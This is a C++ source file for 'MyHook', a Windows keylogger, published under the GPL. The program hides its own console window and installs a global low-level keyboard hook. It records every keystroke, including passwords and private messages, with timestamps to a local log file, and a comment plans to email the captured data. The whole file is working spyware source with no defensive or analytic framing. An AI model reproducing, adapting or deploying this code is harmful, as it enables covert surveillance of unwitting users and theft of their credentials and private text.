/*
    MyHook 1.1
    Copyright 2008 Daniel Amodio (deige101)
    Created for Major League Coding
    http://groups.myspace.com/MajorLeagueCoding

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*
    TENATIVE UPDATES

    *add support for more keystrokes
    *add support for command line paramaters that let the app react different
        could optionaly email data, or could run in debug mode, etc
    *add abstract class for different ways to catch data.
*/

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <time.h>
#include <string>

using namespace std;

// Declare callback function
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );

// Declare function to catch data and do whatever with it
void fcatch(char* data)
{
    FILE *file;
    file=fopen("log.txt","a+");
    fputs(data,file);
    fclose(file);
}

int main()
{
    // Hide the program
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

    // Get current time
    time_t ltime;
    ltime=time(NULL);

    // Add new session to log
    fcatch("\n\n------------------------------------------------------------------------");
    fcatch("\n\t\t\t\t\t\t\t\tMyHook Session\t");
    fcatch(asctime(localtime(&ltime))); // Add timestamp to log file
    fcatch("------------------------------------------------------------------------\n");

    // Retrieve the applications instance
    HINSTANCE appInstance = GetModuleHandle(NULL);

    // Set a global Windows Hook to capture keystrokes.
    SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
    // Declare pointer to the KBDLLHOOKSTRUCT
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;


    switch (wParam)
    {
    case WM_KEYUP: // When the key has been pressed and released
    {
        // Assign keyboard code to local variable
        DWORD vkCode = pKeyBoard->vkCode;

        if ((vkCode>=39)&&(vkCode<=64)) // Keys 0-9
        {
            if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
            {
                switch (vkCode) // 0x30-0x39 is 0-9 respectively
                {
                case 0x30:
                    fcatch(")");
                    break;
                case 0x31:
                    fcatch("!");
                    break;
                case 0x32:
                    fcatch("@");
                    break;
                case 0x33:
                    fcatch("#");
                    break;
                case 0x34:
                    fcatch("$");
                    break;
                case 0x35:
                    fcatch("%");
                    break;
                case 0x36:
                    fcatch("^");
                    break;
                case 0x37:
                    fcatch("&");
                    break;
                case 0x38:
                    fcatch("*");
                    break;
                case 0x39:
                    fcatch("(");
                    break;
                }
            }
            else // If shift key is not down
            {
                char val[5];
                sprintf(val,"%c",vkCode);
                fcatch(val);
            }
        }
        else if ((vkCode>64)&&(vkCode<91)) // Keys a-z
        {
            if (!GetAsyncKeyState(VK_SHIFT)) // If the shift key is not down, un-capitalize letters
            {
                vkCode+=32;
            }
            char val[5];
            sprintf(val,"%c",vkCode);
            fcatch(val);
        }
        else
        {
            switch (vkCode) // Check for other keys
            {
            case VK_SPACE:
                fcatch(" ");
                break;
            case VK_RETURN:
                fcatch("[ENTER]\n");
                break;
            case VK_BACK:
                fcatch("[BKSP]");
                break;
            case VK_TAB:
                fcatch("[TAB]");
                break;
            case VK_LCONTROL:
            case VK_RCONTROL:
                fcatch("[CTRL]");
                break;
            case VK_LMENU:
            case VK_RMENU:
                fcatch("[ALT]");
                break;
            case VK_CAPITAL:
                fcatch("[CAPS]");
                break;
            case VK_ESCAPE:
                fcatch("[ESC]");
                break;
            case VK_INSERT:
                fcatch("[INSERT]");
                break;
            case VK_DELETE:
                fcatch("[DEL]");
                break;
            case VK_NUMPAD0:
                fcatch("0");
                break;
            case VK_NUMPAD1:
                fcatch("1");
                break;
            case VK_NUMPAD2:
                fcatch("2");
                break;
            case VK_NUMPAD3:
                fcatch("3");
                break;
            case VK_NUMPAD4:
                fcatch("4");
                break;
            case VK_NUMPAD5:
                fcatch("5");
                break;
            case VK_NUMPAD6:
                fcatch("6");
                break;
            case VK_NUMPAD7:
                fcatch("7");
                break;
            case VK_NUMPAD8:
                fcatch("8");
                break;
            case VK_NUMPAD9:
                fcatch("9");
                break;
            case VK_OEM_1:
                if (GetAsyncKeyState(VK_SHIFT))
                    fcatch(":");
                else
                    fcatch(";");
                break;
            case VK_OEM_2:
                if (GetAsyncKeyState(VK_SHIFT))
                    fcatch("?");
                else
                    fcatch("/");
                break;
            case VK_OEM_3:
                if (GetAsyncKeyState(VK_SHIFT))
                    fcatch("~");
                else
                    fcatch("`");
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                // do nothing;
                break;
            default: // Catch all misc keys
                // fputc(vkCode,file); // Un-comment this to remove gibberish from the log file
                // printf("%c",vkCode); // Un-comment this line to debug and add support for more keys
                ;
            }
        }
    }
    default:
        return CallNextHookEx( NULL, nCode, wParam, lParam );
    }

    return 0;
}
